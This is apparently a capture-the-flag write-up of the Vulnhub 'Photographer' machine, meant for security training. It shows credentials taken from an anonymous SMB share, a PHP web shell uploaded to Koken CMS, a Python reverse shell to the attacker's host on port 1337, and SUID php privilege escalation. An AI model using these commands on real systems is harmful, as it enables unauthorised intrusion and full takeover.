---
layout: post
title: Photographer
description: Photographer is a linux machine showcasing the exploitation of an authenticated file upload vulnerability.
categories: [writeups]
tags: [vulnhub, Arbitrary File Upload, SUID]
image:
  path: https://www.vulnhub.com/media/img/entry/watermarked/c185a33b9f18350eb96b97074851910a7698bab0.png
---

## **Summary**

Credentials found in a publically accessible share were used to access `Koken CMS`, teh latter was vulnerable to a file upload vulnerability which allowed us to
upload a malicious `php` file and gain access to the machine. After that, a binary with the SUID bit set was leveraged to escalate our privileges.

> Machine can be found in [Vulnhub](https://www.vulnhub.com/entry/photographer-1,519/)
{: .prompt-info }

## **Enumeration**

### **nmap**

I started with an nmap scan which revealed four open ports.

```
$ nmap 192.168.56.104 -sV -sC
```

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

![](/assets/photographer/00-nmap.png)

### **SMB Enumeration**

I used `smbclient` to enumerate the `SMB server` running on port `445`. I started off by listing it's shares.

```
$ smbclient -L 192.168.56.104 -N
```

![](/assets/photographer/01-listshares.png)

I found a share named `sambashare`, which I was able to access anonymously.

```
$ smbclient //192.168.56.104/sambashare -N
smb: \> ls
```

![](/assets/photographer/02-access-sambashare.png)

There was two files `mailsent.txt` and `wordpress.bkp.zip`.  
I downloaded them both.

```
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
```

![](/assets/photographer/03-get-from-share.png)

`mailsent.txt` contained an email with its headers.

```
$ cat mailsent.txt
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

![](/assets/photographer/04-mailsent-txt.png)

It didn't seem important at first, but there was a use for it later on.

The other file `wordpress.bkp.zip` did not contain anything important.

### **Web Enumeration**

There was two `apache` web servers running on port `80` and port `8000`.

#### **Port 80**

I browsed to the first one, but I did not find anything useful.  
I also did not find any hidden resources using `gobuster`.

![](/assets/photographer/05-apache-80.png)

So, I moved to the next one.

#### **Port 8000**

This is The home page of the web server running on port 8000.

![](/assets/photographer/06-apache-8000.png)

I used `gobuster` to find any hidden resources.

```
$ gobuster dir -u http://192.168.56.104:8000 \
--status-codes-blacklist 404,403 \
--exclude-length 0 \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

> --exclude-length 0: exclude the following content length (completely ignores the status)

![](/assets/photographer/07-gobuster-8000.png)

I was able to find an admin portal on `/admin`.

![](/assets/photographer/08-admin-login-page.png)

The credentials I used to login were found on `mailsent.txt` I retrieved from the `sambashare` share.

```
Email address: daisa@photographer.com
Password: babygirl
```

![](/assets/photographer/09-admin.png)

This is `Koken Content Management System (CMS)` which is vulnerable to an `Arbitrary File Upload` in case of an authenticated user.

To exploit this vulnerability I used an exploit found at [exploit-db](https://www.exploit-db.com/exploits/48706).

## **Foothold**

I created a php script and saved it as `image.php.jpg`.

```
$ echo '<?php system($_GET["cmd"]);?>' > image.php.jpg
```

I went back to the admin page, clicked on `import content` at the bottom right of the page, uploaded `image.php.jpg`, and sent the requst to burpsuite.

![](/assets/photographer/10-intercept-upload.png)

I changed the name to `image.php`, and forwarded the request.

![](/assets/photographer/11-change-name.png)

After the upload is done, I went back the koken CMS Library, selected The newly uploaded file, right clicked on `Download File` and copied the link.

![](/assets/photographer/12-access-webshell.png)

To test it I used `curl` and sent a request to the link I copied, and I got a response with the output of the command I provided as a query.

```
$ curl http://192.168.56.104:8000/storage/originals/43/f5/image.php?cmd=id
```

![](/assets/photographer/13-cmd-exec-poc.png)

After getting a working `webshell`, I tried to get a reverse shell.

### **Reverse shell**

To get a reverse shell I used this python payload found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.105",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

I started a listener using `netcat`.

```
$ nc -lnvp 1337
```

![](/assets/photographer/14-listener.png)

I executed the payload with the webshell.

```
$ curl 'http://192.168.56.104:8000/storage/originals/43/f5/image.php?cmd=python3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22192%2E168%2E56%2E105%22%2C1337%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27'
```

![](/assets/photographer/15-payload.png)

And I got a connection back on the `nc` listener.

![](/assets/photographer/16-revshell.png)

To get a fully functioning shell I stabilized it using the folloing commands.

```
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ export TERM=xterm
$ ^Z (CTRL+Z)
kali$ stty raw -echo; fg
```

![](/assets/photographer/16-shell-stabilize.png)

After stabilizing the shell, I got the user flag.

```
$ cd /home/daisa
$ cat user.txt
```

![](/assets/photographer/17-user-flag.png)

## **PrivEsc**

I listed all files with the `SUID` bit set, to see if there is a binary a can use to escalate my priviliges.

```
$ find / -type f -perm -u=s 2>/dev/null
```

![](/assets/photographer/18-suid-bins.png)

The intersting binary I found was `/usr/bin/php7.2`.

`php` can be used to excalate priviles according to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid).

I used the following command to get a shell as root.

```
$ php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

![](/assets/photographer/20-root-shell.png)

After that I got the root flag.

```
$ cd /root
$ cat proof.txt
```

![](/assets/photographer/21-root-flag.png)
